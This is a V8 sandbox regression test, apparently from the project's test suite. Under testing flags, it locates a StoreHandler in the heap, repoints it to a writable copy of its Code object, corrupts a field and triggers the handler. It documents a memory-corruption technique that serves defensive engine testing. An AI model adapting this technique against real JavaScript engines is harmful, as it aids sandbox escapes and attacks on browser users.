// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.
//
// Flags: --sandbox-testing --jit-fuzzing --no-lazy-feedback-allocation --no-baseline-batch-compilation

class Memory {
    constructor() {
        let buffer = new Sandbox.MemoryView(0, 0x100000000);
        this.dataView = new DataView(buffer);
        this.taggedView = new Uint32Array(buffer);
    }
    writeTagged(addr, value) {
        this.dataView.setUint32(addr, value, true);
    }
    readTagged(addr) {
        return this.dataView.getUint32(addr, true);
    }
    copyTagged(source, destination, size) {
        let toIndex = destination / 4;
        let startIndex = source / 4;
        let endIndex = (source + size) / 4;
        this.taggedView.copyWithin(toIndex, startIndex, endIndex);
    }
    copyObjectAt(source) {
        let objectSize = Sandbox.getSizeOfObjectAt(source);
        let placeholder = Array(objectSize).fill().join();
        let destination = Sandbox.getAddressOf(placeholder);
        this.copyTagged(source, destination, objectSize);
        return destination;
    }

};

let memory = new Memory;

function F0() {
    this[42] = 5;
}
// Call once to populate IC and create StoreHandler
new F0();

let f0Addr = Sandbox.getAddressOf(F0);

// Scan the heap forward from F0 to find the StoreHandler (Instance Type 139)
let storeHandlerAddr = 0;
let addr = f0Addr;
for (let i = 0; i < 200; i++) {
    try {
        addr += Sandbox.getSizeOfObjectAt(addr);
        let type = Sandbox.getInstanceTypeIdOfObjectAt(addr);
        if (type == 139) { // STORE_HANDLER_TYPE
            storeHandlerAddr = addr;
            break;
        }
    } catch (e) {
        // Ignore errors if we hit unmapped memory
    }
}

assertNotSame(storeHandlerAddr, 0);
// Read the Code object pointer from offset 4 of the StoreHandler
let val = memory.readTagged(storeHandlerAddr + 4);
// Must be a tagged pointer.
assertEquals(val & 1, 1)
let codeAddr = val & ~3;
// Copy the Code object to writable memory. This is necessary as the Code may live in read-only space.
let newCodeAddr = memory.copyObjectAt(codeAddr);
// Update pointer in StoreHandler to point to the copy
memory.writeTagged(storeHandlerAddr + 4, newCodeAddr | 1);
// Corrupt offset 0x18 of the copied Code object
memory.writeTagged(newCodeAddr + 0x18, 0);
// Trigger the corrupted handler.
new F0();
